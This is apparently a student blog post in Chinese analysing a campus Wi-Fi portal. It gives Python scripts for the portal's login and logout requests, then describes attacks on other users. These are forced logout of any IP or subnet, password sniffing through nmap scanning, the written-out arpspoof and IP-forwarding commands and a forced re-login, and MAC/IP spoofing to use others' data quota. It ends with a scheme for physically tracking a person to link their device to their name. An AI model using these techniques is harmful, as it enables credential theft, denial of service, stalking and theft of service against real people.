---
layout: post
title: "校园无线网的问题"
data: 2019-06-10
tags: [security]
excerpt: "校园网笔记"
comments: false
share: false
---

## 校园网无线登录

这是计算机网络课程的三级项目，一开始是针对校园网无线登录进行业务逻辑分析，以及抓包分析

后来发现了一些问题以及一些利用手段，然后就记录了下来

## 业务逻辑分析

总结：

1. 打开页面
    - 获取用户地址
    - 验证地址是否有在线的账号
    - 根据页面状态，重定向页面

2. 用户登录
    - 发起登录请求
    - 如果登录成功，显示相应的html标签
    - 如果登录成功，请求账户流量信息

3. 用户注销
    - ip地址同步
    - 发起注销请求
    - 如果注销成功，重定向页面

通过上述的业务逻辑分析，可以猜测服务器后台的一些数据的对应信息：

账户([账户名], 账户流量信息)
登录状态([IP地址], 账户名, 是否在线)

## 脚本代码

1. 登录

    由于客户端大部分的登录逻辑都由js脚本完成，所以不用理会`获取本地地址`这个步骤，直接发送post包即可

    这里，代码中没有提交ip地址的信息，最后任然可以登录：

    ```python

    def login():
        url_login = "http://1.1.1.2/ac_portal/login.php"    

        body_login = {
            "opr":"pwdLogin",

            # 你的用户名
            "userName":"",

            # 你的密码
            "pwd":"",

            # 是否记住密码
            "rememberPwd":"0",

            # 要登录的地址
            #"ipv4or6":"172.16.178.167"
        }

        response_login = requests.post(url_login, data=body_login, headers = headers)

        print(response_login.text)

        print(response_login.status_code)
    ```

2. 注销

    ```python
    def logout():
        url_logout = "http://1.1.1.2/ac_portal/login.php"

        body_logout = {
            "opr":"logout",

            # ip地址
            "ipv4or6":""
        }

        response_logout = requests.post(url_logout, data=body_logout, headers = headers)

        soup = BeautifulSoup(response_logout.text, features="lxml")

        p_str = str(soup.p.string).replace("\'", "\"")

        p_json = json.loads(p_str)

        print("success:" + str(p_json['success']))

        print("msg:" + bytes.decode(bytes(p_json['msg'], encoding='iso-8859-1')))

        print("action:" + str(p_json['action']))

        print("pop:" + str(p_json['pop']))

        print("location:" + str(p_json['location']))
    ```

3. 在线状态查询

    ```python
    def isOnline():
        url_isOnline = "http://1.1.1.2/ac_portal/login.php"

        body_isOnline = {
            "opr":"online_check"
        }

        response_isOnline = requests.post(url_isOnline, data=body_isOnline, headers = headers)

        print(response_isOnline.text)
    ```

4. 流量信息查询

    ```python
    def get_info():

        url_infromation = "http://1.1.1.2/ac_portal/userflux"

        response_info = requests.post(url_infromation, headers = headers)

        soup = BeautifulSoup(response_info.text, 'lxml')

        tr_list = soup.find_all('tr')

        value_dict = {}

        for item in tr_list:
            if len(item.find_all('td')) >= 2:
                key = str(item.find_all('td')[0].string)
                key = decode_GB(key)
                value = str(item.find_all('td')[1].string)
                value = decode_GB(value)
                value_dict[key] = value
        for item_key,item_value in value_dict.items():
            print(item_key  + item_value)
    ```

## 缺点以及利用

1. HTTP进行账户密码的明文传输

2. 登录注销的绕过

3. MAC固定分配地址

利用1和2的缺点可以实现用户密码嗅探
利用3以及账号+地址自动登录，可以实现使用他人的流量

### 注销指定IP地址的校园网账户

回顾一下，页面里面，注销的逻辑：
1.用户点击注销按钮页面根据当前用户的地址
2.页面首先发起IP地址获取请求，重新获取本机的IP地址（和前面使用一样的函数）
3.服务器返回IP地址
4.页面根据获取的IP地址，发起注销请求
5.服务器收到注销请求，注销提交地址登录的账号，并返回注销结果
6.页面收到注销结果，在3秒之后，返回登录页面（填写登录信息）

由于这里是页面的逻辑，可以绕过第1,2步，指定我们想要的IP，并对其进行注销

直接使用注销函数，IP地址填写目标机器的IP地址。校园网似乎没有做这个检测，利用数据包中的地址和请求内容的地址再做一次匹对，也许一种解决方法。

限制：

1. 如果登录的时候使用的是IPv6地址，有时候可以注销成功，有时候会注销失败

利用：

1. 假设知道某一个人的地址，可以一直（或者间隔）地发送注销请求，让他无法登录校园网账号

2. 也可以针对一个网段，一直（或者）间隔地发送注销请求

### 用户密码嗅探

方案一：主机存活探测 + ARP单向欺骗 + 注销指定IP地址的账户

这个方法不能针对某一个人获取他的账户密码，但是可以在短时间内随机获取大量'幸运'观众的密码，而，随着时间的增加，可以获取大量的用户密码

限制：

- 没有安装arp防火墙的用户
- 用户登录时使用IPv4地址登记

过程：

使用主机存户探测（`nmap -sn <ipaddress>`）对一个网段进行扫描，获取存活主机

随机选取一个主机进行arp欺骗（`arpspoof -i wlan0 -t <target ip> 172.16.255.254`），打开ip转发（`echo 1 > /proc/sys/net/ipv4/ip_forward`），使用wireshar监听它的

然后利用构造好的注销请求，给这个用户注销，等到这个用户再次登录的时候，就可以获取他的密码

实验：

对自己的手机进行监听:`172.16.29.152`

1. 主机存活探测

2. arp欺骗

3. wireshark监听

4. 主动注销账户，监听登录请求

### 使用他人流量

方案二：使用别人的账户流量

1. 将自己的MAC地址和IP地址改为对方的地址

2. 重新连接校园网

另，如果和对方同时使用相同的地址，最后双方都会很慢。可以使用主机存活探测，检测对方是否在线，如果不在线则可以很好地使用网络

限制：

- 知道对方的IP地址和MAC地址
- 有失败几率

过程：

1. 将自己的MAC地址和IP地址改为对方的地址

2. 重新连接校园网

另，如果和对方同时使用相同的地址，最后双方都会很慢。可以使用主机存活探测，检测对方是否在线，如果不在线则可以很好地使用网络

实验：

手机登录另一个校园网账户

172.16.29.152

dc:f0:90:8b:98:9f

1. 将自己的MAC地址和IP地址改为对方的地址

2. 重新连接校园网

### 如何获取地址

#### 如何获取指定一个人的IP地址以及mac地址

仅提供思路

可以实现并利用的手段：

1. 监听本机可以探测到的路由器，获取连接某个路由器的所有设备的MAC地址

2. 可以探测整个网段存活主机的IP地址和MAC地址

思路：

线下跟随目标人物，比如，在E座上课，利用方法1获取周边所有设备的MAC地址，换一个地方再使用方法1，获取周边所有设备的MAC地址，如此做n次（2~4），然后取n个数据集的交，获得m个MAC地址

利用方法2，监听整个网段的存活主机（主动或被动），寻找那m个MAC地址匹配的IPv4地址

利用方案2，获得校园网账户名，去Mystu或者邮箱列表查找对应的人名，最后得到：

`<ip_address, mac_address, username, student_name>`

#### 如何获取所有人的IP地址以及MAC地址

被动或主动监听整个网段
